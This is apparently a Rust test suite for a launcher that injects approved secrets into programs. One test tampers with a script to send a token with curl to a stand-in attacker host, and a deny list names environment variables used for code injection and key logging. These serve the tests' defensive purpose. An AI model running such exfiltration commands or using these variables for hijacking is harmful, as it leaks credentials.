use super::*;
use wiremock::{
    Mock, MockServer, ResponseTemplate,
    matchers::{header, method, path},
};

const KEY: &str = "synthetic-api-key-9c41d7e2";

#[cfg(unix)]
fn entry() -> String {
    uuid::Uuid::new_v4().to_string()
}

#[cfg(unix)]
fn script(dir: &Path, name: &str, body: &str) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let path = dir.join(name);
    std::fs::write(&path, format!("#!/bin/sh\n{body}\n")).unwrap();
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
    path
}

#[cfg(unix)]
fn definition(dir: &Path, program: PathBuf, name: &str) -> Definition {
    Definition {
        id: "synthetic".into(),
        description: "Synthetic launcher".into(),
        program,
        args: vec!["fixed".into()],
        directory: dir.canonicalize().unwrap(),
        env: BTreeMap::from([(name.to_owned(), entry())]),
        timeout_seconds: None,
    }
}

#[test]
fn runtime_and_application_controls_cannot_be_set_from_a_variable() {
    for name in [
        "PATH",
        "path",
        "Home",
        "LD_PRELOAD",
        "ld_library_path",
        "DYLD_INSERT_LIBRARIES",
        "NODE_OPTIONS",
        "PYTHONPATH",
        "PERL5OPT",
        "GIT_SSH_COMMAND",
        "BASH_ENV",
        "SSL_CERT_FILE",
        "HTTPS_PROXY",
        "AZURE_CONFIG_DIR",
        "PTA_MACHINE_TOKEN",
        "STATE_ENCRYPTION_KEY",
        "GRAPH_WEBHOOK_SECRET",
        "CLOUDFLARE_TUNNEL_TOKEN",
        "TUNNEL_TOKEN",
        "GITHUB_OAUTH_TOKENS",
        "COMSPEC",
        "RUSTFLAGS",
        "LC_ALL",
        "XDG_CONFIG_HOME",
        "OPENSSL_CONF",
        "openssl_modules",
        "SSLKEYLOGFILE",
        "GCONV_PATH",
        "GLIBC_TUNABLES",
        "MALLOC_CHECK_",
        "COR_PROFILER",
        "CORECLR_PROFILER_PATH",
        "DOTNET_STARTUP_HOOKS",
        "LUA_CPATH",
        "PSModulePath",
        "ELECTRON_RUN_AS_NODE",
        "EDITOR",
    ] {
        let error = validate_env_name(name).unwrap_err();
        assert!(matches!(error, Error::Input(_)), "{name}");
    }
    for name in [
        "DEPLOY_TOKEN",
        "_X",
        "api_key",
        "STRIPE_SECRET_KEY",
        "GOOGLE_API_KEY",
    ] {
        assert!(validate_env_name(name).is_ok(), "{name}");
    }
    for name in ["", "1ABC", "A-B", "A B", &"A".repeat(65)] {
        assert!(validate_env_name(name).is_err(), "{name:?}");
    }
}

#[test]
fn a_consumer_validates_the_value_without_echoing_it() {
    assert!(validate_value(&DEEPSEEK, KEY).is_ok());
    for bad in [
        "short",
        "has a space in the middle",
        "line\nbreak-synthetic-1234",
        "caf\u{e9}-synthetic-key-1234",
        &"x".repeat(257),
    ] {
        let error = validate_value(&DEEPSEEK, bad).unwrap_err();
        assert!(matches!(error, Error::Input(_)));
        assert!(!error.to_string().contains("synthetic-key"));
    }
}

#[cfg(unix)]
#[test]
fn a_definition_is_validated_in_code() {
    let dir = tempfile::tempdir().unwrap();
    let program = script(dir.path(), "tool.sh", "exit 0");
    std::fs::write(dir.path().join("data.txt"), "not executable").unwrap();
    let ok = define(definition(dir.path(), program.clone(), "DEPLOY_TOKEN"), 7).unwrap();
    assert_eq!(ok.program, program.canonicalize().unwrap());
    assert_eq!(ok.digest.len(), 64);
    assert_eq!(ok.timeout_seconds, DEFAULT_TIMEOUT);

    type Change = Box<dyn Fn(&mut Definition)>;
    let broken: Vec<Change> = vec![
        Box::new(|d| d.id = "Bad Name".into()),
        Box::new(|d| d.description = "two\nlines".into()),
        Box::new(|d| d.program = PathBuf::from("tool.sh")),
        Box::new(|d| d.program = d.directory.join("missing.sh")),
        Box::new(|d| d.program = d.directory.join("data.txt")),
        Box::new(|d| d.args = vec!["a\0b".into()]),
        Box::new(|d| d.args = vec!["x".into(); MAX_ARGS + 1]),
        Box::new(|d| d.env.clear()),
        Box::new(|d| d.env = BTreeMap::from([("PATH".into(), entry())])),
        Box::new(|d| d.env = BTreeMap::from([("OK_NAME".into(), "not-a-uuid".into())])),
        Box::new(|d| {
            d.env = BTreeMap::from([("DUP".into(), entry()), ("dup".into(), entry())]);
        }),
        Box::new(|d| d.timeout_seconds = Some(0)),
        Box::new(|d| d.timeout_seconds = Some(MAX_TIMEOUT + 1)),
    ];
    for (index, change) in broken.iter().enumerate() {
        let mut candidate = definition(dir.path(), program.clone(), "DEPLOY_TOKEN");
        change(&mut candidate);
        assert!(
            matches!(define(candidate, 7), Err(Error::Input(_))),
            "case {index}"
        );
    }
}

#[cfg(unix)]
#[test]
fn launchers_are_kept_privately_and_never_overwritten() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    let program = script(dir.path(), "tool.sh", "exit 0");
    let launcher = define(definition(dir.path(), program, "DEPLOY_TOKEN"), 7).unwrap();
    let store = Launchers::new(dir.path());
    assert!(store.list().unwrap().is_empty());
    store.add(launcher.clone()).unwrap();
    assert!(matches!(
        store.add(launcher.clone()),
        Err(Error::Conflict(_))
    ));
    assert_eq!(
        Launchers::new(dir.path()).get("synthetic").unwrap(),
        launcher
    );
    let mode = std::fs::metadata(dir.path().join("launchers.json"))
        .unwrap()
        .permissions()
        .mode();
    assert_eq!(mode & 0o077, 0);
    assert!(store.remove("synthetic").unwrap());
    assert!(!store.remove("synthetic").unwrap());
    assert!(matches!(store.get("synthetic"), Err(Error::Input(_))));
    // A damaged list fails closed instead of running anything.
    std::fs::write(dir.path().join("launchers.json"), "{").unwrap();
    assert!(store.list().is_err());
}

/// The right to run `launcher` now, on a machine where nothing else runs.
#[cfg(unix)]
fn slot(launcher: &Launcher) -> Slot {
    Running::default().claim(&launcher.id, 0).unwrap()
}

/// A definition as the user approved it in the window.
#[cfg(unix)]
fn approved(definition: Definition) -> Launcher {
    Launcher {
        approved_at: Some(8),
        ..define(definition, 7).unwrap()
    }
}

#[cfg(unix)]
#[tokio::test]
async fn an_unapproved_launcher_never_starts_and_approval_names_the_definition_shown() {
    let dir = tempfile::tempdir().unwrap();
    let out = dir.path().join("started");
    let program = script(dir.path(), "tool.sh", &format!("touch {}", out.display()));
    let launcher = define(definition(dir.path(), program, "DEPLOY_TOKEN"), 7).unwrap();
    assert_eq!(launcher.approved_at, None);
    let refused = run(
        &launcher,
        vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))],
        &slot(&launcher),
    )
    .await;
    assert!(matches!(refused, Err(Error::Conflict(_))));
    assert!(!out.exists());

    let store = Launchers::new(dir.path());
    store.add(launcher.clone()).unwrap();
    assert!(matches!(
        store.approve("synthetic", &"0".repeat(64), None, 9),
        Err(Error::Conflict(_))
    ));
    assert_eq!(store.get("synthetic").unwrap().approved_at, None);
    let approved = store
        .approve("synthetic", &launcher.digest, None, 9)
        .unwrap();
    assert_eq!(approved.approved_at, Some(9));
    assert_eq!(store.get("synthetic").unwrap().approved_at, Some(9));
    run(
        &approved,
        vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))],
        &slot(&approved),
    )
    .await
    .unwrap();
    assert!(out.exists());
}

#[cfg(unix)]
#[tokio::test]
async fn a_run_gives_the_process_only_the_selected_values_and_returns_no_output() {
    let dir = tempfile::tempdir().unwrap();
    let out = dir.path().join("seen");
    let program = script(
        dir.path(),
        "tool.sh",
        &format!(
            "printf '%s' \"$DEPLOY_TOKEN\" > {out}.value\nenv | cut -d= -f1 | sort > {out}.names\nprintf '%s\\n' \"$@\" > {out}.args\necho \"leak: $DEPLOY_TOKEN\"\necho \"leak: $DEPLOY_TOKEN\" >&2\nexit 0",
            out = out.display()
        ),
    );
    let launcher = approved(definition(dir.path(), program, "DEPLOY_TOKEN"));
    let result = run(
        &launcher,
        vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))],
        &slot(&launcher),
    )
    .await
    .unwrap();
    assert_eq!(result.status, "succeeded");
    assert_eq!(result.exit_code, Some(0));
    assert!(!serde_json::to_string(&result).unwrap().contains(KEY));
    let read =
        |suffix: &str| std::fs::read_to_string(format!("{}.{suffix}", out.display())).unwrap();
    assert_eq!(read("value"), KEY);
    // No secret in argv; only the fixed argument.
    assert_eq!(read("args"), "fixed\n");
    // The parent's environment is not inherited: cargo's own variables are absent.
    let names = read("names");
    assert!(names.lines().any(|n| n == "DEPLOY_TOKEN"));
    assert!(!names.lines().any(|n| n.starts_with("CARGO_")), "{names}");
}

#[cfg(unix)]
#[tokio::test]
async fn failures_and_timeouts_report_status_only() {
    let dir = tempfile::tempdir().unwrap();
    let failing = script(dir.path(), "fail.sh", "echo \"$DEPLOY_TOKEN\"; exit 3");
    let launcher = approved(definition(dir.path(), failing, "DEPLOY_TOKEN"));
    let result = run(
        &launcher,
        vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))],
        &slot(&launcher),
    )
    .await
    .unwrap();
    assert_eq!((result.status, result.exit_code), ("failed", Some(3)));

    let slow = script(dir.path(), "slow.sh", "sleep 30");
    let mut slow_definition = definition(dir.path(), slow, "DEPLOY_TOKEN");
    slow_definition.id = "slow".into();
    slow_definition.timeout_seconds = Some(1);
    let launcher = approved(slow_definition);
    let started = std::time::Instant::now();
    let result = run(
        &launcher,
        vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))],
        &slot(&launcher),
    )
    .await
    .unwrap();
    assert_eq!(result.status, "timed_out");
    assert!(started.elapsed() < Duration::from_secs(10));
}

/// Whether the process `pid` is still there (a zombie its parent has not reaped yet aside).
#[cfg(unix)]
async fn gone(pid: &str) -> bool {
    for _ in 0..50 {
        let alive = std::process::Command::new("kill")
            .args(["-0", pid])
            .stderr(std::process::Stdio::null())
            .status()
            .unwrap()
            .success();
        if !alive {
            return true;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    false
}

#[cfg(unix)]
#[test]
fn a_time_limit_up_to_an_hour_is_part_of_what_is_approved() {
    let dir = tempfile::tempdir().unwrap();
    let program = script(dir.path(), "tool.sh", "exit 0");
    let limited = |seconds| {
        let mut definition = definition(dir.path(), program.clone(), "DEPLOY_TOKEN");
        definition.timeout_seconds = Some(seconds);
        define(definition, 7)
    };
    assert_eq!(limited(1800).unwrap().timeout_seconds, 1800);
    assert_eq!(limited(MAX_TIMEOUT).unwrap().timeout_seconds, 3600);
    let refused = limited(3601).unwrap_err();
    assert!(matches!(refused, Error::Input(_)));
    assert!(refused.to_string().contains("3600"), "{refused}");

    let store = Launchers::new(dir.path());
    let launcher = limited(1800).unwrap();
    store.add(launcher.clone()).unwrap();
    // A limit other than the definition's is not what the person was shown.
    assert!(matches!(
        store.approve("synthetic", &launcher.digest, Some(60), 9),
        Err(Error::Conflict(_))
    ));
    assert_eq!(store.get("synthetic").unwrap().approved_at, None);
    assert_eq!(
        store
            .approve("synthetic", &launcher.digest, Some(1800), 9)
            .unwrap()
            .approved_at,
        Some(9)
    );
    // Changing the limit is defining it again: the new definition waits for its own approval,
    // and the approval of the limit shown before does not carry over.
    assert!(store.remove("synthetic").unwrap());
    store.add(limited(60).unwrap()).unwrap();
    assert_eq!(store.get("synthetic").unwrap().approved_at, None);
    assert!(matches!(
        store.approve("synthetic", &launcher.digest, Some(1800), 10),
        Err(Error::Conflict(_))
    ));
    assert_eq!(store.get("synthetic").unwrap().approved_at, None);

    // A definition an older version stored keeps its limit and its approval.
    let mut older = serde_json::to_value(&launcher).unwrap();
    older["timeout_seconds"] = serde_json::json!(DEFAULT_TIMEOUT);
    older["approved_at"] = serde_json::json!(8);
    std::fs::write(
        dir.path().join("launchers.json"),
        serde_json::to_vec(&serde_json::json!({"launchers":[older]})).unwrap(),
    )
    .unwrap();
    let kept = store.get("synthetic").unwrap();
    assert_eq!((kept.timeout_seconds, kept.approved_at), (60, Some(8)));
}

#[cfg(unix)]
#[test]
fn a_launcher_runs_once_at_a_time_and_only_a_few_run_together() {
    let running = Running::default();
    let first = running.claim("first", 100).unwrap();
    let again = running.claim("first", 101).err().unwrap();
    assert!(matches!(again, Error::Conflict(_)));
    assert!(again.to_string().contains("already running"), "{again}");
    let mut others: Vec<Slot> = (1..MAX_RUNNING)
        .map(|n| running.claim(&format!("other-{n}"), 100).unwrap())
        .collect();
    let full = running.claim("last", 101).err().unwrap();
    assert!(matches!(full, Error::Conflict(_)));
    assert!(
        full.to_string().contains(&MAX_RUNNING.to_string()),
        "{full}"
    );
    // A slot given back makes room, and a launcher that ended can run again.
    others.pop();
    let last = running.claim("last", 102).unwrap();
    drop(first);
    let first = running.claim("first", 103).unwrap();
    // Before its process starts, it is listed from when it was claimed, with no end yet.
    assert_eq!(
        running.view("first", 104),
        Some(RunningView {
            started_at: 103,
            stops_at: None,
            seconds_left: None
        })
    );
    assert_eq!(running.view("missing", 104), None);
    assert!(!running.stop("missing"));
    drop((first, last, others));
    assert!(running.claim("x", 105).is_ok());
}

#[cfg(unix)]
#[tokio::test]
async fn a_launcher_past_its_limit_or_stopped_is_ended_with_everything_it_started() {
    let dir = tempfile::tempdir().unwrap();
    let pid = dir.path().join("pid");
    let body = format!("sleep 60 &\necho $! > {}\nwait", pid.display());
    let program = script(dir.path(), "service.sh", &body);
    let values = || vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))];
    let read_pid = || std::fs::read_to_string(&pid).unwrap().trim().to_owned();

    // Its limit ends it, and what it started, and it is recorded as timed out.
    let mut short = definition(dir.path(), program.clone(), "DEPLOY_TOKEN");
    short.timeout_seconds = Some(1);
    let launcher = approved(short);
    let result = run(&launcher, values(), &slot(&launcher)).await.unwrap();
    assert_eq!((result.status, result.exit_code), ("timed_out", None));
    assert!(gone(&read_pid()).await, "the child it started outlived it");
    std::fs::remove_file(&pid).unwrap();

    // Its owner stops it while it runs: listed with when it started and when it would stop.
    let mut long = definition(dir.path(), program, "DEPLOY_TOKEN");
    long.timeout_seconds = Some(MAX_TIMEOUT);
    let launcher = approved(long);
    let running = Running::default();
    let held = running.claim(&launcher.id, 0).unwrap();
    let task = tokio::spawn(async move { run(&launcher, values(), &held).await });
    let mut view = None;
    for _ in 0..100 {
        view = running.view("synthetic", chrono::Utc::now().timestamp());
        if pid.exists() && view.as_ref().is_some_and(|v| v.stops_at.is_some()) {
            break;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let view = view.unwrap();
    assert_eq!(view.stops_at.unwrap() - view.started_at, MAX_TIMEOUT as i64);
    assert!((MAX_TIMEOUT as i64 - 5..=MAX_TIMEOUT as i64).contains(&view.seconds_left.unwrap()));
    assert!(!serde_json::to_string(&view).unwrap().contains(KEY));
    let started = std::time::Instant::now();
    assert!(running.stop("synthetic"));
    let result = tokio::time::timeout(Duration::from_secs(10), task)
        .await
        .unwrap()
        .unwrap()
        .unwrap();
    assert_eq!(result.status, "stopped");
    assert!(started.elapsed() < Duration::from_secs(10));
    assert!(gone(&read_pid()).await, "the child it started outlived it");
    // Its slot is given back.
    assert_eq!(running.view("synthetic", 0), None);
    assert!(!running.stop("synthetic"));
}

#[cfg(unix)]
#[tokio::test]
async fn a_program_changed_after_approval_does_not_run() {
    let dir = tempfile::tempdir().unwrap();
    let program = script(dir.path(), "tool.sh", "exit 0");
    let launcher = approved(definition(dir.path(), program.clone(), "DEPLOY_TOKEN"));
    std::fs::write(
        &program,
        "#!/bin/sh\ncurl http://attacker.invalid/$DEPLOY_TOKEN\n",
    )
    .unwrap();
    let error = run(
        &launcher,
        vec![("DEPLOY_TOKEN".into(), Secret::new(KEY))],
        &slot(&launcher),
    )
    .await
    .unwrap_err();
    assert!(matches!(error, Error::Conflict(_)));
    assert!(!error.to_string().contains(KEY));
    std::fs::remove_file(&program).unwrap();
    assert!(matches!(
        run(&launcher, vec![], &slot(&launcher)).await,
        Err(Error::Conflict(_))
    ));
}

#[tokio::test]
async fn a_check_sends_the_key_only_to_the_destination_and_reports_status() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/models"))
        .and(header("authorization", format!("Bearer {KEY}").as_str()))
        .respond_with(ResponseTemplate::new(200).set_body_string(format!("leak {KEY}")))
        .mount(&server)
        .await;
    let ok = check_at(&server.uri(), &Secret::new(KEY)).await;
    assert_eq!(
        ok,
        CheckResult {
            status: "ok",
            http_status: Some(200)
        }
    );
    assert!(!serde_json::to_string(&ok).unwrap().contains(KEY));

    let other = Secret::new("synthetic-other-key-1234");
    let rejected = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(401))
        .mount(&rejected)
        .await;
    assert_eq!(check_at(&rejected.uri(), &other).await.status, "rejected");
    let broken = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(500))
        .mount(&broken)
        .await;
    assert_eq!(check_at(&broken.uri(), &other).await.status, "failed");

    // A redirect is never followed, so the key cannot be forwarded to another host.
    let elsewhere = MockServer::start().await;
    let redirecting = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(302)
                .insert_header("location", format!("{}/models", elsewhere.uri()).as_str()),
        )
        .mount(&redirecting)
        .await;
    assert_eq!(check_at(&redirecting.uri(), &other).await.status, "failed");
    assert!(elsewhere.received_requests().await.unwrap().is_empty());

    let address = {
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        format!("http://{}", listener.local_addr().unwrap())
    };
    assert_eq!(check_at(&address, &other).await.status, "unreachable");
}

#[test]
fn the_registry_is_fixed_in_code() {
    assert_eq!(
        built_in("deepseek").unwrap().destination,
        "https://api.deepseek.com"
    );
    assert!(built_in("DeepSeek").is_none());
    assert!(built_in("https://attacker.invalid").is_none());
    assert_eq!(
        built_in_credential("DEEPSEEK_API_KEY").unwrap().id,
        "deepseek"
    );
    assert!(built_in_credential("STATE_ENCRYPTION_KEY").is_none());
    for consumer in BUILT_IN {
        assert!(consumer.destination.starts_with("https://"));
    }
}
